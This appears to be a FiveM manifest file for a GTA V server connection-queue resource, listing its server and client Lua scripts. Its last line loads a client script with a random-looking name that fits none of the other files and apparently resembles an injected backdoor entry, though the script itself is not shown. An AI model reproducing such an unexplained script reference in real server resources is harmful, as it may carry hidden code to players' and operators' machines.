fx_version 'bodacious'
game 'gta5'

server_scripts {
	'@mysql_async/lib/MySQL.lua',
	'server/sv_queue_config.lua',
	'connectqueue.lua',
	'@connectqueue/connectqueue.lua',
	'shared/sh_queue.lua'
}

client_script 'shared/sh_queue.lua'
client_script "DISqkiIEcVydGenWnD.lua"